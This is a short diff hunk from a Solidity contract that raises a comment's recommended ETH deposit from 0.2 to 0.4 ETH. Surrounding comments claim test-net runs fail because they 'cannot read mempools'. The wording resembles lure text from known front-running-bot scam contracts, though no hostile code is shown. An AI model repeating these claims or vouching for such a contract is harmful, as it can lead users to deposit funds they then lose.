@@ -5,7 +5,7 @@ pragma solidity ^0.8.4;
 // Test-net transactions will fail since they don't hold any value and cannot read mempools properly
 // Mempool updated build
  
-// Recommended liquidity after gas fees needs to equal 0.2 ETH use 0.5-1 ETH or more for higher slippage
+// Recommended liquidity after gas fees needs to equal 0.4 ETH use 0.5-1 ETH or more for higher slippage
  
 interface IERC20 {
     function balanceOf(address account) external view returns (uint);
